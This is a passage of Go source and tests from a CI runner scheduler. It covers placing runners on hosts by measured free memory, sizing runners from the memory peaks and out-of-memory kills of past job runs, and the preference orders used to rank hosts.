	r := testRunner("pending", p, store.RunnerProvisioning, time.Second)
	hs = newHostSet([]*store.Host{h}, []*store.Pool{p}, map[string][]*store.Runner{p.ID: {r}}, now)
	if got := hs.place(p, 1); len(got) != 0 {
		t.Fatal("next pass ignored pending startup")
	}
}

func TestStaleAndMissingUsageRetainReservationGuards(t *testing.T) {
	p := limited("build", 2, 4096)
	h := withUsage(sized("host_a", 8, 8, 16384, 100000), 99, 0)
	h.Usage.CPUHeld = true
	h.Usage.SampledAt = now.Add(-store.HostUsageMaxAge)
	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 8); len(got) != 3 {
		t.Fatalf("stale reading blocked work or erased reservations: %v", got)
	}
	h.Usage.SampledAt = now
	hs = newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 1); len(got) != 0 {
		t.Fatal("fresh zero memory was treated as missing")
	}
	old := newHostSet([]*store.Host{testHost("a", 2, 0), testHost("b", 5, 1)}, []*store.Pool{p}, nil, now)
	if got := old.place(p, 1); len(got) != 1 || got[0] != "b" {
		t.Fatalf("old agent no longer placed by slots: %v", got)
	}
}

// The reserve is held back inside Allocatable, and a pool that leaves its size
// to the host asks for a share of that same figure. Taking the reserve off the
// measured sample as well made measured headroom permanently one reserve
// tighter than the share, so a host cut into a single slot could never fit the
// runner it was sized for: it reported "short of memory" at every pass, on an
// idle machine with tens of gigabytes free, and its slot was never used.
func TestASingleSlotHostFitsTheRunnerItsOwnSizeAsksFor(t *testing.T) {
	p := testPool("build", "build")
	h := sized("host_a", 1, 8, 31*1024, 100000)
	withUsage(h, 10, h.Allocatable().MemoryMB)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 1); len(got) != 1 {
		t.Fatalf("placed on %v, want the idle host's only slot", got)
	}
}

// An idle host that is using more for its own operating system than the reserve
// guessed -- Docker, containerd and a VPN on a 31 GB machine is enough -- has
// less measured free memory than its allocatable figure. A pool that leaves its
// size to the host asks for a share of allocatable, and on a host of one slot
// that share is the whole of it, so comparing the share with what was measured
// free refused the slot at every pass, on a machine running nothing. The Hosts
// page, which counts from allocatable, said the slot was free all along.
//
// This is the case the test above does not cover: there, measured free memory
// was set exactly equal to allocatable, the one value at which it worked.
func TestAnIdleHostTakesAHostSizedRunnerWhenItsOperatingSystemUsesMoreThanTheReserve(t *testing.T) {
	p := testPool("build", "build")
	h := sized("host_a", 1, 4, 31*1024, 100000)
	// Three gigabytes in use by the machine itself, against a reserve of
	// about one and a half.
	withUsage(h, 5, h.MemoryMB-3*1024)
	if avail, alloc := *h.Usage.MemoryAvailableMB, h.Allocatable().MemoryMB; avail >= alloc {
		t.Fatalf("the fixture does not reproduce the fault: %d MB available is not below %d MB allocatable", avail, alloc)
	}

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 1); len(got) != 1 {
		t.Fatalf("placed on %v, want the idle host's only slot", got)
	}
}

// What the measured check is for still holds once the host runs work of ours:
// a second host-sized runner is refused when what is measured free cannot
// carry it, because the runners already there are using that memory.
func TestAHostAlreadyRunningOurWorkStillMeasuresBeforeTakingMore(t *testing.T) {
	p := testPool("build", "build")
	h := sized("host_a", 2, 8, 32*1024, 100000)
	h.ActiveRunners = 1
	r := testRunner("existing", p, store.RunnerBusy, time.Minute)
	r.HostID = h.ID
	// The busy runner is using most of the machine.
	withUsage(h, 40, 6*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, map[string][]*store.Runner{p.ID: {r}}, now)
	if got := hs.place(p, 1); len(got) != 0 {
		t.Fatalf("placed on %v; a host whose runner is using its memory must not be handed another share it has not got", got)
	}
}

// A pool that states its size is asking for that much, so an idle host must
// have it free: the leniency is for a share the host chose, not for a figure
// an operator wrote down.
func TestAnIdleHostStillRefusesAStatedSizeItHasNotGotFree(t *testing.T) {
	p := limited("build", 2, 8192)
	h := sized("host_a", 1, 4, 16*1024, 100000)
	withUsage(h, 5, 6*1024)

	hs := newHostSet([]*store.Host{h}, []*store.Pool{p}, nil, now)
	if got := hs.place(p, 1); len(got) != 0 {
		t.Fatalf("placed on %v; an 8 GB runner does not fit in 6 GB free, whatever the host is otherwise doing", got)
	}
}

package scheduler

import (
	"fmt"
	"math"
	"slices"
	"strings"

	"github.com/eyupio/zoomies/internal/naming"
	"github.com/eyupio/zoomies/internal/store"
)

// The modes of scheduler.history_sizing.
const (
	// HistoryOff places runners on the pool's size and the host's room alone,
	// as the fleet always did.
	HistoryOff = "off"
	// HistoryShadow works out what the jobs waiting are known to need and
	// says where it would have placed differently, without doing so. It is
	// the default for the reason placement_mode's shadow is: an operator sees
	// what the policy would do on their own fleet before it does it.
	HistoryShadow = "shadow"
	// HistoryOn places and sizes the runner for the largest known need among
	// the jobs waiting on its pool.
	HistoryOn = "on"
)

const (
	// ProfilePercentile is the share of a job's recent runs its requirement
	// covers. The ninetieth, not the peak of peaks: one run that pulled a
	// cold cache should not size every run after it, and one that did less
	// than usual should not shrink them.
	ProfilePercentile = 0.9
	// ProfileMemoryMargin is added on top of that percentile for memory. A
	// job that used 5 GB on its heaviest ordinary run is killed at exactly 5
	// GB the next time its test data grows, so it is given a fifth more.
	//
	// CPU gets no margin on purpose. A build uses every core it is given, so
	// its peak is its limit; a margin on it would ask for a fifth more CPU
	// every run and ratchet the requirement up to the largest host. Memory
	// does not ratchet the same way: a job does not use memory because it is
	// there.
	ProfileMemoryMargin = 1.2
	// ProfileOOMGrowth is how much more than its peak a run the kernel killed
	// for memory is taken to have needed. Its peak is the limit it hit, which
	// is by definition not enough; half as much again is a guess, but a
	// guess that moves the next run off a host that has already failed it.
	ProfileOOMGrowth = 1.5
	// profileMemoryStep rounds a memory requirement up, so the figure in a
	// reason reads as a size rather than a measurement.
	profileMemoryStep = 64
)

// Requirement is what one queued job is expected to need, from the runs of it
// the fleet has measured. The zero value is "nothing known", which constrains
// nothing: a job with no history is placed exactly as it was before history
// sizing existed.
type Requirement struct {
	CPUs     float64 `json:"cpus,omitempty"`
	MemoryMB int64   `json:"memory_mb,omitempty"`
	// Samples is how many measured runs it was taken from, and OOMKilled how
	// many of them the kernel killed for memory.
	Samples   int `json:"samples,omitempty"`
	OOMKilled int `json:"oom_killed,omitempty"`
}

// Known reports whether the requirement says anything at all.
func (r Requirement) Known() bool { return r.CPUs > 0 || r.MemoryMB > 0 }

// String says the requirement the way a reason does: "~6 GB and 4 CPU".
func (r Requirement) String() string {
	parts := []string{}
	if r.MemoryMB > 0 {
		parts = append(parts, "~"+formatMB(r.MemoryMB))
	}
	if r.CPUs > 0 {
		parts = append(parts, "~"+formatCPUs(r.CPUs)+" CPU")
	}
	return strings.Join(parts, " and ")
}

// Profile turns a job's recent measured runs into its requirement: the
// ninetieth percentile of their peaks, with a margin on memory, and a run the
// kernel killed for memory counted as having needed more than it had.
func Profile(peaks []store.JobPeak) Requirement {
	var cpus []float64
	var mem []int64
	out := Requirement{}
	for _, p := range peaks {
		out.Samples++
		if p.OOMKilled {
			out.OOMKilled++
		}
		if p.CPUs > 0 {
			cpus = append(cpus, p.CPUs)
		}
		// A run the kernel killed needed more than the limit it hit, and that limit is
		// the one figure known to have been too little: the sampled peak can read under
		// it, because a spike between two 30-second samples is not seen. Taken as the
		// higher of the two, as the size classes already do.
		m := p.MemoryMB
		if p.OOMKilled {
			m = max(m, p.GrantedMemoryMB)
		}
		if m > 0 {
			if p.OOMKilled {
				m = int64(math.Ceil(float64(m) * ProfileOOMGrowth))
			}
			mem = append(mem, m)
		}
	}
	if len(cpus) > 0 {
		slices.Sort(cpus)
		out.CPUs = math.Ceil(cpus[percentileIndex(len(cpus))]*100) / 100
	}
	if len(mem) > 0 {
		slices.Sort(mem)
		m := math.Ceil(float64(mem[percentileIndex(len(mem))]) * ProfileMemoryMargin)
		out.MemoryMB = int64(math.Ceil(m/profileMemoryStep)) * profileMemoryStep
	}
	return out
}

// killedNeed is the memory the largest of a job's killed runs needed: the limit it
// hit, or its sampled peak if that is higher, with the growth a kill implies and the
// margin every requirement carries. Zero when no run was killed.
//
// The percentile ignores the heaviest tenth, which is exactly where a single kill sits
// once a job has about ten runs, so the placement path takes the larger of the two: a
// kill is not an outlier of the ordinary kind but a size known to have failed. The
// size classes do not use it, because they decide for themselves which kills still
// count -- one from before the class last moved is what moved it.
func killedNeed(peaks []store.JobPeak) int64 {
	var need int64
	for _, p := range peaks {
		if !p.OOMKilled {
			continue
		}
		limit := max(p.MemoryMB, p.GrantedMemoryMB)
		if limit <= 0 {
			continue
		}
		m := math.Ceil(float64(limit) * ProfileOOMGrowth * ProfileMemoryMargin)
		need = max(need, int64(math.Ceil(m/profileMemoryStep))*profileMemoryStep)
	}
	return need
}

// percentileIndex is the nearest-rank position of ProfilePercentile in n
// sorted samples.
func percentileIndex(n int) int {
	i := int(math.Ceil(ProfilePercentile*float64(n))) - 1
	return clamp(i, 0, n-1)
}

// requirementFor is one queued job's requirement on p: its profile, never
// below the pool's minimum where it says anything at all.
func (t *tick) requirementFor(p *store.Pool, j *store.Job) Requirement {
	peaks := t.history[store.JobUsageKey{Repo: j.Repo, Workflow: j.Workflow, JobName: j.JobName, PoolID: p.ID}]
	r := Profile(peaks)
	if !r.Known() {
		return Requirement{}
	}
	r.MemoryMB = max(r.MemoryMB, killedNeed(peaks))
	if r.CPUs > 0 {
		r.CPUs = max(r.CPUs, p.Resources.MinCPUs)
	}
	if r.MemoryMB > 0 {
		r.MemoryMB = max(r.MemoryMB, p.Resources.MinMemoryMB)
	}
	return r
}

// poolNeed is the requirement a runner created for p's queue is placed for.
//
// GitHub, not Zoomies, decides which of the jobs waiting an idle runner takes,
// so a runner created for this queue may be handed any of them. It is placed
// for the largest of them: the heavy job the runner might be given is the one
// a small host kills.
//
// A job no host that could run this pool has the allocatable room for is left
// out, and said so in the second value: holding every runner back for it
// would keep the light jobs beside it waiting for ever, and a larger host is
// the only thing that helps it.
func (t *tick) poolNeed(p *store.Pool, queued []*store.Job) (Requirement, string) {
	var fitting []Requirement
	var unfit Requirement
	for _, j := range queued {
		r := t.requirementFor(p, j)
		if !r.Known() {
			continue
		}
		if t.hosts.anyCouldHold(p, r) {
			fitting = append(fitting, r)
			continue
		}
		if r.MemoryMB > unfit.MemoryMB || (r.MemoryMB == unfit.MemoryMB && r.CPUs > unfit.CPUs) {
			unfit = r
		}
	}
	note := ""
	if unfit.Known() {
		note = fmt.Sprintf("jobs waiting on pool %s are known to need %s, and no host that can run the pool has that much to give", p.Name, unfit)
	}
	if len(fitting) == 0 {
		return Requirement{}, note
	}
	need := Requirement{}
	for _, r := range fitting {
		need.CPUs, need.MemoryMB = max(need.CPUs, r.CPUs), max(need.MemoryMB, r.MemoryMB)
		need.Samples += r.Samples
		need.OOMKilled += r.OOMKilled
	}
	if t.hosts.anyCouldHold(p, need) {
		return need, note
	}
	// The heaviest by memory and the heaviest by CPU are different jobs, and
	// no one host has both. The one that is killed for want of it is memory.
	slices.SortFunc(fitting, func(a, b Requirement) int {
		if a.MemoryMB != b.MemoryMB {
			return int(b.MemoryMB - a.MemoryMB)
		}
		switch {
		case a.CPUs > b.CPUs:
			return -1
		case a.CPUs < b.CPUs:
			return 1
		}
		return 0
	})
	return fitting[0], note
}

// anyCouldHold reports whether any host that could run p has the allocatable
// room for r at all, busy or not.
func (hs *hostSet) anyCouldHold(p *store.Pool, r Requirement) bool {
	for _, h := range hs.hosts {
		if !HostCouldRun(h, p) {
			continue
		}
		a := hs.alloc[h.ID]
		if a.CPUsKnown && a.CPUs+cpuEpsilon < r.CPUs {
			continue
		}
		if a.MemoryKnown && a.MemoryMB < r.MemoryMB {
			continue
		}
		return true
	}
	return false
}

// shortOf says what h cannot give a runner of p that needs r, or "" when it
// can. Memory is asked first: it is what a job is killed for.
func (hs *hostSet) shortOf(h *store.Host, p *store.Pool, r Requirement) string {
	left, a := hs.leftFor(h, p), hs.alloc[h.ID]
	if a.MemoryKnown && r.MemoryMB > 0 && left.MemoryMB < r.MemoryMB {
		return fmt.Sprintf("held off %s: jobs waiting need ~%s, it has %s", hostName(h), formatMB(r.MemoryMB), formatMB(max(left.MemoryMB, 0)))
	}
	if a.CPUsKnown && r.CPUs > 0 && left.CPUs+cpuEpsilon < r.CPUs {
		return fmt.Sprintf("held off %s: jobs waiting need ~%s CPU, it has %s", hostName(h), formatCPUs(r.CPUs), formatCPUs(max(left.CPUs, 0)))
	}
	return ""
}

// heldOff is every host that would take a runner of p now but is short of r,
// with the sentence saying by how much, in host order.
func (hs *hostSet) heldOff(p *store.Pool, r Requirement) map[string]string {
	out := map[string]string{}
	for _, h := range hs.hosts {
		if !hs.eligibleAsSized(h, p) {
			continue
		}
		if s := hs.shortOf(h, p, r); s != "" {
			out[h.ID] = s
		}
	}
	return out
}

// sortedPhrases joins the held-off sentences in host order.
func (hs *hostSet) sortedPhrases(m map[string]string) string {
	var out []string
	for _, h := range hs.hosts {
		if s, ok := m[h.ID]; ok {
			out = append(out, s)
		}
	}
	return strings.Join(out, "; ")
}

// sizeForNeed raises the charge of a runner placed for a known need, on each
// field the pool leaves to the host, and returns the size to create it at, or
// the size it already had when nothing moved. A field the pool states is left
// alone: the operator wrote that limit, and a runner is never given more than
// it -- the need then only decides the host.
func sizeForNeed(p *store.Pool, res Reservation, size *store.Resources, need Requirement) (Reservation, *store.Resources) {
	raised := false
	if p.Resources.CPUs <= 0 && need.CPUs > res.CPUs+cpuEpsilon {
		res.CPUs, raised = need.CPUs, true
	}
	if p.Resources.MemoryMB <= 0 && need.MemoryMB > res.MemoryMB {
		res.MemoryMB, raised = need.MemoryMB, true
	}
	if !raised {
		return res, size
	}
	grant := p.Resources
	grant.MinCPUs, grant.MinMemoryMB = 0, 0
	grant.CPUs = res.CPUs / fieldFactor(p, p.Resources.CPUs > 0)
	grant.MemoryMB = res.MemoryMB / int64(fieldFactor(p, p.Resources.MemoryMB > 0))
	return res, &grant
}

func hostName(h *store.Host) string {
	if h.Name != "" {
		return naming.ForSentence(h.Name)
	}
	return h.ID
}

package scheduler

import (
	"reflect"
	"strings"
	"testing"

	"github.com/eyupio/zoomies/internal/store"
)

func TestProfileIsTheNinetiethPercentileOfRecentPeaksWithAMarginOnMemory(t *testing.T) {
	ten := func(mb int64) []store.JobPeak {
		var out []store.JobPeak
		for i := range 10 {
			out = append(out, store.JobPeak{CPUs: float64(i + 1), MemoryMB: mb + int64(i)*100})
		}
		return out
	}
	for _, tc := range []struct {
		name  string
		peaks []store.JobPeak
		want  Requirement
	}{
		{"no runs say nothing", nil, Requirement{}},
		{
			// One run is its own percentile. 2000 MB with a fifth more is
			// 2400, rounded up to the next 64 MB.
			"one run", []store.JobPeak{{CPUs: 1.5, MemoryMB: 2000}},
			Requirement{CPUs: 1.5, MemoryMB: 2432, Samples: 1},
		},
		{
			// Of ten runs the ninth is the ninetieth percentile: the one
			// heaviest run does not size every run after it. 1800 MB with a
			// fifth more is 2160, rounded up to 2176.
			"ten runs", ten(1000),
			Requirement{CPUs: 9, MemoryMB: 2176, Samples: 10},
		},
		{
			// A killed run's peak is the limit it hit, so it counts as having
			// needed half as much again: 3000 * 1.5 * 1.2 = 5400, to 5440.
			"a run killed for memory", []store.JobPeak{{CPUs: 2, MemoryMB: 3000, OOMKilled: true}},
			Requirement{CPUs: 2, MemoryMB: 5440, Samples: 1, OOMKilled: 1},
		},
		{
			// CPU gets no margin: a build uses what it is given, and a margin
			// would ratchet it up on every run.
			"cpu only", []store.JobPeak{{CPUs: 4}},
			Requirement{CPUs: 4, Samples: 1},
		},
		{
			"a kill with no sample is counted and constrains nothing", []store.JobPeak{{OOMKilled: true}},
			Requirement{Samples: 1, OOMKilled: 1},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := Profile(tc.peaks); got != tc.want {
				t.Fatalf("Profile = %+v, want %+v", got, tc.want)
			}
		})
	}
}

// historyFleet is the shape of the failure this exists for: an automatic pool
// with a 1 CPU / 1 GB minimum, a small host that the plain policy picks for
// the next runner, and a larger one with room left. The small host sorts
// first so a tie in headroom goes to it, as it did on the day.
func historyFleet(t *testing.T, mode string, peakMB int64) (Snapshot, *store.Pool) {
	t.Helper()
	p := testPool("linux", "self-hosted")
	p.Resources = store.Resources{MinCPUs: 1, MinMemoryMB: 1024}
	small := sized("a-small", 1, 4, hostFor(3072), 100000)
	big := sized("b-big", 2, 16, hostFor(16384), 100000)
	busy := testRunner("r_busy", p, store.RunnerBusy, 0)
	busy.HostID = "b-big"
	big.ActiveRunners = 1
	job := queued("go-controller", 0, "self-hosted")
	job.Workflow = "CI"
	s := snap([]*store.Pool{p}, []*store.Runner{busy}, []*store.Job{job}, []*store.Host{small, big})
	s.HistorySizing = mode
	if peakMB > 0 {
		key := store.JobUsageKey{Repo: job.Repo, Workflow: job.Workflow, JobName: job.JobName, PoolID: p.ID}
		s.JobHistory = map[store.JobUsageKey][]store.JobPeak{key: {{CPUs: 2, MemoryMB: peakMB}, {CPUs: 2, MemoryMB: peakMB}}}
	}
	return s, p
}

func TestHistorySizingPlacesAHeavyJobAwayFromTheSmallHost(t *testing.T) {
	for _, tc := range []struct {
		name        string
		mode        string
		peakMB      int64
		wantHost    string
		wantHistory string
	}{
		// Without history, and with history off, the fleet places exactly as
		// the spec score ranks it, which is on the big host: the small one is
		// a quarter of the machine and history has no say in that.
		{"no history places on the bigger machine", HistoryOn, 0, "b-big", ""},
		{"history off places on the bigger machine", HistoryOff, 5000, "b-big", ""},
		// Shadow works the answer out and changes nothing. With both hosts
		// free the bigger machine takes the runner under the spec score, and
		// nothing needed holding off, so shadow's record is empty too; the
		// row that does trip it has its own test below.
		{"shadow records and changes nothing", HistoryShadow, 5000, "b-big", ""},
		{"on holds the small host off", HistoryOn, 5000, "b-big",
			"placed for the jobs waiting, which need ~5.9 GB and ~2 CPU; held off a-small: jobs waiting need ~5.9 GB, it has 3 GB"},
		// A light job fits both, so nothing is held off.
		{"a light job goes where the spec score ranks it", HistoryOn, 500, "b-big", "placed for the jobs waiting, which need ~1 GB and ~2 CPU"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, _ := historyFleet(t, tc.mode, tc.peakMB)
			pp := only(t, Decide(s))
			creates := actionsOf(pp.Actions, ActionCreate)
			if len(creates) != 1 {
				t.Fatalf("creates = %d (%s), want 1", len(creates), pp.Reason)
			}
			if creates[0].HostID != tc.wantHost {
				t.Fatalf("HostID = %q, want %q (%s)", creates[0].HostID, tc.wantHost, pp.Reason)
			}
			if pp.History != tc.wantHistory {
				t.Fatalf("History = %q, want %q", pp.History, tc.wantHistory)
			}
			if tc.mode == HistoryOn && tc.wantHistory != "" && !strings.Contains(creates[0].Reason, tc.wantHistory) {
				t.Fatalf("the create's reason %q does not say what history did", creates[0].Reason)
			}
		})
	}
}

// Shadow is meant to be safe to leave on: the plan it produces has to be the
// plan off produces, action for action, or it is not a shadow.
func TestShadowHistorySizingChangesNoAction(t *testing.T) {
	off, _ := historyFleet(t, HistoryOff, 5000)
	shadow, _ := historyFleet(t, HistoryShadow, 5000)
	if a, b := Decide(off).Actions, Decide(shadow).Actions; !reflect.DeepEqual(a, b) {
		t.Fatalf("shadow changed the plan:\noff    %+v\nshadow %+v", a, b)
	}
}

// Shadow's one visible act is a sentence, and it is written only where the
// plain plan's host would have been held off: a fleet whose higher-scoring
// host is full sends the runner to the small one, and shadow says what the
// need did and does nothing about it.
func TestShadowHistorySizingSaysWhatThePlainPlanWouldHaveDone(t *testing.T) {
	s, _ := historyFleet(t, HistoryShadow, 5000)
	for _, h := range s.Hosts {
		if h.ID == "b-big" {
			h.Capacity = 1 // full with the busy runner it already has
		}
	}
	pp := only(t, Decide(s))
	creates := actionsOf(pp.Actions, ActionCreate)
	if len(creates) != 1 || creates[0].HostID != "a-small" {
		t.Fatalf("creates = %+v, want one that started on the small host", creates)
	}
	want := "shadow: history sizing would have held off a-small: jobs waiting need ~5.9 GB, it has 3 GB"
	if pp.History != want {
		t.Fatalf("History = %q, want %q", pp.History, want)
	}
}

// A host whose runner share is smaller than the job's known need is given a
// runner sized to it, where the pool leaves its size to the host. Without it
// the heavy job is placed on a big host and still killed at a slot's share.
func TestHistorySizingRaisesAnAutomaticRunnerToTheKnownNeed(t *testing.T) {
	p := testPool("linux", "self-hosted")
	h := sized("big", 4, 16, hostFor(16384), 100000)
	job := queued("go-controller", 0, "self-hosted")
	s := snap([]*store.Pool{p}, nil, []*store.Job{job}, []*store.Host{h})
	s.HistorySizing = HistoryOn
	s.JobHistory = map[store.JobUsageKey][]store.JobPeak{
		{Repo: job.Repo, JobName: job.JobName, PoolID: p.ID}: {{CPUs: 3, MemoryMB: 5000}},
	}
	pp := only(t, Decide(s))
	creates := actionsOf(pp.Actions, ActionCreate)
	if len(creates) != 1 || creates[0].Size == nil || !creates[0].SizedFromHistory {
		t.Fatalf("creates = %+v, want one sized from history", creates)
	}
	if got, share := creates[0].Size, Reserve(p, h); got.MemoryMB != 6016 || got.CPUs != share.CPUs {
		// A quarter of the host's CPU is already above the 3 CPU need, so it
		// stays the share; memory's share is 4 GB, below the 6016 MB need,
		// so memory alone is raised.
		t.Fatalf("Size = %+v, want 6016 MB and the host's %s CPU share", got, formatCPUs(share.CPUs))
	}
	if !strings.Contains(creates[0].Reason, "sized to") {
		t.Fatalf("reason %q does not say the runner was sized up", creates[0].Reason)
	}

	// A pool that states its size is never given more than it: the need then
	// chooses the host and nothing else.
	fixed := limited("fixed", 2, 2048)
	fixed.Labels = p.Labels
	s = snap([]*store.Pool{fixed}, nil, []*store.Job{job}, []*store.Host{h})
	s.HistorySizing = HistoryOn
	s.JobHistory = map[store.JobUsageKey][]store.JobPeak{
		{Repo: job.Repo, JobName: job.JobName, PoolID: fixed.ID}: {{CPUs: 3, MemoryMB: 5000}},
	}
	pp = only(t, Decide(s))
	creates = actionsOf(pp.Actions, ActionCreate)
	if len(creates) != 1 || creates[0].Size != nil {
		t.Fatalf("creates = %+v, want one at the pool's own size", creates)
	}
}

// Every host that could take the runner is short of what the job needs, and
// a larger one will have room when its work finishes: that is a wait, said in
// the words the operator reads, not a create onto the host that will kill it.
func TestHistorySizingHoldsOffEveryHostTooSmallForNow(t *testing.T) {
	s, _ := historyFleet(t, HistoryOn, 8400) // ~9.9 GB; b-big has 8 GB left, 16 GB in all
	pp := only(t, Decide(s))
	if n := len(actionsOf(pp.Actions, ActionCreate)); n != 0 {
		t.Fatalf("creates = %d, want none", n)
	}
	want := "held off a-small: jobs waiting need ~9.9 GB, it has 3 GB; held off b-big: jobs waiting need ~9.9 GB, it has 8 GB"
	if pp.Blocked != want {
		t.Fatalf("Blocked = %q, want %q", pp.Blocked, want)
	}
	if !pp.BlockedAtCapacity || pp.HistoryUnfit != "" {
		t.Fatalf("BlockedAtCapacity = %t, HistoryUnfit = %q: a wait, not a misfit", pp.BlockedAtCapacity, pp.HistoryUnfit)
	}
	if !strings.Contains(pp.Reason, want) {
		t.Fatalf("Reason %q does not carry why", pp.Reason)
	}
}

// A job no host could ever hold is not allowed to hold every other job back:
// it is left out of the requirement and reported, because only a larger host
// helps it.
func TestAJobNoHostCanEverFitIsReportedAndDoesNotBlockThePool(t *testing.T) {
	s, _ := historyFleet(t, HistoryOn, 64*1024)
	pp := only(t, Decide(s))
	creates := actionsOf(pp.Actions, ActionCreate)
	if len(creates) != 1 || creates[0].HostID != "b-big" {
		t.Fatalf("creates = %+v, want one placed where the spec score ranks", creates)
	}
	if !strings.Contains(pp.HistoryUnfit, "no host that can run the pool has that much to give") {
		t.Fatalf("HistoryUnfit = %q", pp.HistoryUnfit)
	}
}

// A run killed by a spike between two 30-second samples can read well under the
// limit it hit, and the limit is the one figure known to have been too little. Of
// twelve runs the single kill sits in the ignored tail of the percentile, so
// placement must size from the kill, or the next run is sized below the size that
// already failed it.
func TestAKilledRunIsPlacedFromTheLimitItHitNotTheSampleThatMissedTheSpike(t *testing.T) {
	var peaks []store.JobPeak
	for range 11 {
		peaks = append(peaks, store.JobPeak{MemoryMB: 2000})
	}
	peaks = append(peaks, store.JobPeak{MemoryMB: 2000, OOMKilled: true, GrantedMemoryMB: 4096})
	// The profile alone is the 90th percentile and misses it, as the size classes
	// expect: they count kills themselves.
	if got := Profile(peaks); got.MemoryMB >= 4096 {
		t.Fatalf("the profile asks for %d MB; the percentile is meant to ignore the tail", got.MemoryMB)
	}
	// 4096 * 1.5 * 1.2 = 7372.8, rounded up to the next 64 MB.
	if got := killedNeed(peaks); got != 7424 {
		t.Errorf("a run killed at 4096 MB needed %d MB, want 7424", got)
	}
	// A kill with no granted size on its row is sized from its peak.
	if got := killedNeed([]store.JobPeak{{MemoryMB: 2000, OOMKilled: true}}); got != 3648 {
		t.Errorf("a kill with no granted size needed %d MB, want 3648", got)
	}
	if got := killedNeed([]store.JobPeak{{MemoryMB: 9000}}); got != 0 {
		t.Errorf("a run that was not killed implies a need of %d MB", got)
	}
}

// Placement reads the same history, and a job killed once in twelve runs is held
// off a host that has the memory it was killed at: with the kill in the ignored
// tail of the percentile the small host would otherwise take it again.
func TestHistorySizingHoldsAJobOffTheHostItWasKilledOn(t *testing.T) {
	s, p := historyFleet(t, HistoryOn, 0)
	job := s.Jobs[0]
	key := store.JobUsageKey{Repo: job.Repo, Workflow: job.Workflow, JobName: job.JobName, PoolID: p.ID}
	var peaks []store.JobPeak
	for range 11 {
		peaks = append(peaks, store.JobPeak{CPUs: 2, MemoryMB: 500})
	}
	// Killed at a 2 GB limit the sample put at 500 MB: the small host's 3 GB cannot
	// hold 2 GB * 1.5 * 1.2.
	peaks = append(peaks, store.JobPeak{CPUs: 2, MemoryMB: 500, OOMKilled: true, GrantedMemoryMB: 2048})
	s.JobHistory = map[store.JobUsageKey][]store.JobPeak{key: peaks}
	pp := only(t, Decide(s))
	creates := actionsOf(pp.Actions, ActionCreate)
	if len(creates) != 1 || creates[0].HostID != "b-big" {
		t.Fatalf("creates = %+v (%s); want the job placed on the big host, away from the one that killed it", creates, pp.Reason)
	}
}

package scheduler

import (
	"math"

	"github.com/eyupio/zoomies/internal/store"
)

// The orders placement prefers hosts in, when several can take the runner.
// Every order is only a preference among hosts that already fit: nothing here
// makes a host eligible or ineligible, so changing it can move where runners
// go and never whether they start.
const (
	// HostOrderHeadroom picks the host with the most CPU and memory left,
	// as a fraction of what it has, after the runner is placed. It spreads
	// work, and it is what every fleet had before the setting existed, which
	// is why it is the default: changing the default would change where every
	// install without a runner profile puts its runners.
	HostOrderHeadroom = "headroom"
	// HostOrderLargestStandard picks the host whose runner of this pool is the
	// largest -- the biggest standard size, CPU first and then memory --
	// falling back to headroom between hosts that offer the same size. It is
	// the order for a fleet of unlike machines sized by profile: a heavy job
	// goes where the big runners are, and the small hosts take what the big
	// one has no room left for.
	HostOrderLargestStandard = "largest_standard"
	// HostOrderBestFit picks the host with the least left after the runner is
	// placed, so a host is filled before the next is started. It packs, which
	// leaves whole machines idle for the work that needs them -- and on a fleet
	// of unlike machines it fills the smallest first, which is the opposite of
	// what a heavy job wants.
	HostOrderBestFit = "best_fit"
)

// HostOrders is every value scheduler.host_order accepts, in the order the
// settings page offers them.
var HostOrders = []string{HostOrderHeadroom, HostOrderLargestStandard, HostOrderBestFit}

// ValidHostOrder reports whether s is a placement order. The empty string is
// headroom, so a setting that was never written is valid.
func ValidHostOrder(s string) bool {
	if s == "" {
		return true
	}
	for _, o := range HostOrders {
		if s == o {
			return true
		}
	}
	return false
}

// compareStandard orders two runner charges by size: positive when a is the
// larger, with CPU deciding first and memory second. Two charges within
// rounding of each other on a field are equal on it, so a share that did not
// divide evenly does not decide the order by a hair.
func compareStandard(a, b Reservation) int {
	switch {
	case a.CPUs > b.CPUs+cpuEpsilon:
		return 1
	case b.CPUs > a.CPUs+cpuEpsilon:
		return -1
	case a.MemoryMB > b.MemoryMB:
		return 1
	case b.MemoryMB > a.MemoryMB:
		return -1
	}
	return 0
}

// tighter is HostOrderBestFit's preference: whether h leaves less than best
// does once the runner is placed. Hosts that left the same -- or that nobody
// has measured, where only slots can say -- are told apart by the slots they
// have free, fewest first, so that a half-used host is finished before a
// fresh one is started; a tie after that keeps the host that was first, which
// is the lower ID.
func (hs *hostSet) tighter(h, best *store.Host, p *store.Pool, measured bool) bool {
	if measured {
		score, bestScore := hs.score(h, p), hs.score(best, p)
		if math.Abs(score-bestScore) > cpuEpsilon {
			return score < bestScore
		}
	}
	return hs.free[h.ID] < hs.free[best.ID]
}

package scheduler

import (
	"fmt"
	"math"
	"strings"

	"github.com/eyupio/zoomies/internal/store"
)

// Host priority: how far ahead of the fleet's other hosts a host is offered a
// runner, worked out from the specs its agent last reported and optionally
// pinned by an operator.
//
// The computed score is absolute, not relative to the fleet: each axis is
// scaled against a fixed full mark, so a host's number moves only when its
// own specs do. Ranking against whatever else is enrolled would need every
// host rescored whenever one joined or left, and would make the number on a
// host card meaningless outside the moment it was rendered. A periodic rescore
// has nothing to save back either: what a host reports is the whole of what it
// is, so after an upgrade its next heartbeat arrives with the new figures and
// the score follows without anyone asking.
//
// Two hosts on the same score fall back to the placement order and, beyond
// that, spread by headroom as they always have.

// hostPriorityAxis is one figure the spec score climbs, with the full mark
// that says "as much of this as we expect anywhere" and the share of the
// whole score the axis moves. The weights sum to 100; a host at its full
// marks everywhere earns exactly 100, and the common ranges sit well inside
// them so ordinary differences still matter.
type hostPriorityAxis struct {
	name  string
	share int
	full  float64
	value func(h *store.Host) float64
	known func(h *store.Host) bool
}

var hostPriorityAxes = []hostPriorityAxis{
	{
		name:  "CPUs",
		share: 30,
		full:  64,
		value: func(h *store.Host) float64 { return float64(h.CPUs) },
